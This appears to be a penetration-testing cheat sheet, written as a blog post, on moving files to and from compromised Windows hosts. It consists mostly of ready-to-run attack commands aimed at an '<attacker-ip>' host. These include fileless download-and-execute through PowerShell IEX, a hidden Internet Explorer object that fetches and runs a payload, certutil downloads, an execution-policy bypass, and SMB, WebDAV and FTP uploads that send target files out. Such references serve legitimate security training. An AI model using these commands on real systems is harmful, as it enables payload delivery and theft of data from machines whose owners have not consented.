---
title: "Windows File Transfers"
date: 2025-08-22
categories: ["File Trasfers"]
tags: ["File Transfers", "Powershell", "CMD", "Python"]
description: "Basic methods and commands to tranfer files from and to Windows systems"
---

# ** Using Powershell to tranfer files **

---

# **1. Base64 Copy Paste **

### a. From Linux to Windows
```bash
cat file | base64 -w 0; echo

aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg==
```

```c
[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg=="))

cat C:\Users\Public\file
```
> Use base64 to encode the file we want to tranfer
>
> Copy the output and paste it to a PowerShell function for decoding
>
> Attempt to read the contents of the decoded base64 file

### b. From Windows to Linux
```c
[Convert]::ToBase64String((Get-Content -path "C:\Users\Public\file" -Encoding byte))

aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg==
```

```bash
echo aGFjay5jb20uY3kgYXQgeW91ciBzZXJ2aWNlICg6Cg== | base64 -d > file
```

> Encode file using Powershell and copy the output
>
> Paste the output and decoded in Linux using base64 command


***


# ** 2. Web Downloads & Uploads **

### a. Download a file (WebClinet)
```bash
python3 -m http.server 80
```

```c
(New-Object Net.WebClient).DownloadFile('http://<attacker-ip>/file','C:\Users\Public\Downloads\file')
```

> Spin up a webserver using python on attacker's machine
>
> Use WebClient download the file in spicified path


### b. Download and Execute File in memory
```bash
cat command.ps1

ipconfig

python3 -m http.server 80
```

```c
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/file.ps1')
```

> Create a file that includes a `command` and serve it with a python webserver
>
> Use `Invoke-Expression` (IEX) to run the file command directly in memory
>

### c. Download a Hidden IE com object
```bash
cat command.ps1

ipconfig

python3 -m http.server 80
```

```c
$ie = New-Object -ComObject InternetExplorer.Application;
$ie.visible = $False;
$ie.navigate('http://<attacker-ip>/command.ps1');
Start-Sleep -s 5;
$r = $ie.Document.body.innerHTML;
$ie.quit();
IEX $r
```

> Create a hidden Internet Explorer instance and hide the windows
>
> Navigates and waits for the script to load
>
> Extracts, Closes Internet Explorer Window then Executes the malicious payload
>

### d. Download a file with CMD (certutil)
```bash
python3 -m http.server 80
```

```c
certutil -urlcache -f http://<attacker-ip>/file -o file
```

> Spin up a python webserver
>
> Uses CMD and a built-in `certutil.exe` to download a file
>

### e. Upload a file with PowerShell
```bash
python3 -m venv .venv

source .venv/bin/activate 

pip3 install uploadserver

python3 -m uploadserver 80
```

```c
powershell.exe -ep bypass

. .\PSUpload.ps1

Invoke-FileUpload -Uri http://<attacker-ip>/upload -File C:\Users\Public\Downloads\file
```


> Create a python3 virtual environment
>
> Start the python3 upload server
>
> Download, Import and use [this](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) PowerShell script to upload the file


***


# ** 3. Using SMB to Download data **

### a. Using impacket-smbserver to Download
```bash
sudo impacket-smbserver share -smb2support /home/kali/ShareDiretory -user dotpirate -password dotpirate
```

```c
net use n: \\<attacker-ip>\share /user:dotpirate dotpirate

copy ./file.txt n:\file.txt
```

> Create an smbshare using `impacket-smbserver` which requires username and password
>
> Map the smb share on the windows target
>
> Copy the file over to the mapped share using CMD

### b. Using WebDav Server to Upload (requires elevated privileges)
```bash
cd ~/Desktop

mkdir webdav-server

cd webdav-server

sudo apt install python3-wsgidav

wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/Desktop/webdav-server --auth=anonymous 
```

```c
sc query WebClient

sc start WebClient

dir \\<attacker-ip>\DavWWWRoot

copy C:\Users\Public\Downloads\file \\<attacker-ip>\DavWWWRoot\file
```

> Download and install the python3 webdav server
>
> Create a directory to Serve the server by specifying the root directory with `--root=` 
>
> Check if WebClient service is running on Windows `(requires elevated privileges)` 
>
> Check connection, and then upload the file


***


# ** 4. Using FTP to Download and Uplaoad **

### a. Download Files
```bash
python3 -m venv .venv

source .venv/bin/activate 

sudo pip3 install pyftpdlib

sudo python3 -m pyftpdlib --port 21
```

```c
(New-Object Net.WebClient).DownloadFile('ftp://<attacker-ip>/file.txt', 'C:\Users\Public\file.txt')
```
> Create a python3 virtual environment
>
> Install python3 ftp module and setup python3 ftp server
>
> Download the file on the windows host

### b. Upload Files
```bash
python3 -m venv .venv

source .venv/bin/activate 

sudo pip3 install pyftpdlib

python3 -m pyftpdlib --port 21 --write
```

```c
(New-Object Net.WebClient).UploadFile('ftp://<attacker-ip>/file', 'C:\Users\Public\file')
```

> Create a python3 virtual environment
>
> Install python3 ftp module and setup python3 ftp server with write permissions
>
> Upload the file to attackers ftp server